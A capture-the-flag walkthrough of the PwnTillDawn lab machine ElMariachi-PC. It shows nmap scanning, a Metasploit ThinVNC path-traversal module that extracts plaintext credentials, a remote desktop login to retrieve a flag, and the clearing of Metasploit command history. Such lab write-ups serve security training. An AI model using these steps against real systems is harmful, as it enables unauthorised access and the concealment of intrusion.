# PwnTillDwn Walkthrough ElMariachi-PC

## Target Profile
* **Hostname: ElMariachi-PC** 
* **IP Address: 10.150.150.69**
* **Operating System: Windows** 
* **Objective: Retrieve FLAG67**

## 1. Reconnaissance
The engagement began with active network mapping and target identification to understand the scope of the PwnTillDawn environment.

**Network Discovery**  

An initial ping sweep was executed across the subnet to identify live hosts without aggressively scanning ports.

**Command** : 

```bash
nmap -sn 10.150.150.0/24
```

* **Result** : This confirmed the presence of active machines on the network and verified our specific target was reachable.

**Target Identification**  

Utilizing the PwnTillDawn platform, a specific target machine was selected for this engagement.
* **Target IP Address** : 10.150.150.69.
* **Operating System** : Windows.

## 2. Scanning

Once the target was confirmed as a live host, a comprehensive port and service scan was executed to identify potential entry points, host details, and vulnerabilities.

**Service Enumeration Command** :

```bash
nmap -sC -sV -p- 10.150.150.69
```

**Key Findings** :

The intensive scan completed in 762.16 seconds. It discovered multiple open TCP ports :

  * `135/tcp` (msrpc)
  * `139/tcp` (netbios-ssn)
  * `445/tcp` (microsoft-ds)
  * `3389/tcp` (ms-wbt-server / Microsoft Terminal Services)
  * `60000/tcp` (unknown)

**Hostname Discovery** : 

During the Nmap service enumeration, the SSL certificate and NTLM info scripts revealed the target's NetBIOS and DNS computer name to be `ElMariachi-PC`.

**Vulnerability Identification** : 

While most ports ran standard Windows services, port `60000/tcp` returned unique HTTP fingerprint data. The Nmap NSE scripts captured an `HTTP/1.1 401 Access Denied` response.

**Crucial Discovery** : 

This `401` response explicitly exposed a Digest realm for `"ThinVNC"`. This indicated that a ThinVNC web server was running on a non-standard port, presenting a highly probable attack vector.

## 3. Gaining Access
With the `ThinVNC` service identified on port `60000`, the Metasploit Framework was utilized to search for and exploit known vulnerabilities associated with this software.

**Exploitation Steps** :

* Initiated the Metasploit console from the Kali Linux terminal using the command :

  ```bash
  msfconsole
  ```
* Searched for applicable modules with the command : 

  ```bash
  search ThinVNC
  ```

* Selected the `auxiliary/scanner/http/thinvnc_traversal` module by entering :

  ```bash
  use 0
  ```

* Reviewed the default module parameters using :

  ```bash
  show options
  ```

* Configured the target parameters :

  ```bash
  set RHOST 10.150.150.69
  ```

  ```bash
  set RPORT 60000
  ```

* Verified the updated parameters by running :

  ```bash
  show options
  ```

* Executed the attack against the target using the command :

  ```bash
  exploit
  ```

**Exploit Results** :

The path traversal attack successfully read the `ThinVnc.ini` file and extracted plain-text credentials.

  *  **Extracted Username** : `desperado`
  *  **Extracted Password** : `TooComplicatedToGuessMeAhahahahahahahh`

**System Compromise** :

  1. Navigated a web browser to the ThinVNC portal at `http://10.150.150.69:60000`.
  2. Authenticated using the extracted credentials for the user `desperado`.
  3. In the ThinVNC web interface, specified the Machine as `rdesktop`.
  4. Enabled the options for "Full Color" and "Mouse Control".
  5. Clicked "Connect" to establish the remote desktop session.
  6. Accessed the remote Windows desktop and navigated the file explorer to locate the target file `FLAG67.txt`.
  7. Extracted the flag hash: `2971f3459fe55db1237aad5e0f0a259a41633962`.
  8. Submitted the hash on the PwnTillDawn platform for FLAG67.
  9. The platform confirmed the machine `ElMariachi-PC` was successfully compromised by `Dannyz` on `17 March 2026`.

## 4. Escalate Privileges
The initial access gained via the ThinVNC directory traversal vulnerability provided sufficient system privileges to navigate the desktop and locate the target objective.

## 5. Maintain Access
Establishing persistence mechanisms, such as creating backdoors or adding new administrator accounts, was out of scope for this specific PwnTillDawn engagement. The primary objective was achieved upon initial system compromise and flag extraction.

## 6. Clear Tracks
To adhere to post-exploitation best practices and sanitize the local attacker environment, the operational history within the Metasploit Framework was reviewed and subsequently purged.

* **Review History** :

  First, the `history` command was executed to review the session's actions. The console displayed the log of commands used during the exploitation phase .
    
  ```bash
  history
  ```

* **Clear History** :

  The `history -c` command was then executed to wipe the record.
  
  ```bash
  history -c
  ```

* **System Response** :

  The console returned the message `[+] Command history and history file cleared`. This ensured that sensitive commands, target IPs, and methodologies used during the session were removed from the local Kali Linux logs.

* **Confirmation** :

  Finally, the `history` command was executed once more to verify the deletion. The output displayed only the current 1 history command, confirming the operational tracks were successfully and completely cleared.
  
  ```bash
  history
  ```

